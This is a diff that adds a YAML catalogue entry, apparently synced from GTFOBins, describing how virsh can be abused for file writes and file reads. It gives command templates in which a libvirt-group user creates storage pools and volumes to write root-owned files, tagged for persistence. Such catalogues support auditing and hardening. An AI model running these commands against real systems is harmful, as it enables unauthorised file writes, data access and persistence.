@@ -1,0 +1,40 @@
+id: gtfobins/virsh/file-write/unprivileged
+type: binary
+platform: linux
+name: virsh
+phases:
+- persistence
+capabilities:
+- file-write
+privilege_required: user
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: "echo DATA >/path/to/temp-file\n\ncat >/path/to/temp-file.xml <<EOF\n<volume type='file'>\n\
+    \  <name>y</name>\n  <key>/path/to/output-dir/output-file</key>\n  <source>\n  </source>\n  <capacity\
+    \ unit='bytes'>5</capacity>\n  <allocation unit='bytes'>4096</allocation>\n  <physical unit='bytes'>5</physical>\n\
+    \  <target>\n    <path>/path/to/output-dir/output-file</path>\n    <format type='raw'/>\n    <permissions>\n\
+    \      <mode>0600</mode>\n      <owner>0</owner>\n      <group>0</group>\n    </permissions>\n  </target>\n\
+    </volume>\nEOF\n\nvirsh -c qemu:///system pool-create-as x dir --target /path/to/output-dir/\nvirsh\
+    \ -c qemu:///system vol-create --pool x --file /path/to/temp-file.xml\nvirsh -c qemu:///system vol-upload\
+    \ --pool x /path/to/output-dir/output-file /path/to/temp-file\nvirsh -c qemu:///system pool-destroy\
+    \ x"
+  comment: This requires the user to be in the `libvirt` group. If the target directory doesn't exist,
+    `pool-create-as` must be run with the `--build` option. The destination file ownership and permissions
+    can be set in the XML.
+- template: 'virsh -c qemu:///system pool-create-as x dir --target /path/to/dir/
+
+    virsh -c qemu:///system vol-download --pool x input-file output-file
+
+    virsh -c qemu:///system pool-destroy x'
+  comment: This requires the user to be in the `libvirt` group.
+references:
+- https://gtfobins.github.io/gtfobins/virsh/
+tags:
+- linux
+- unix
+- gtfobins
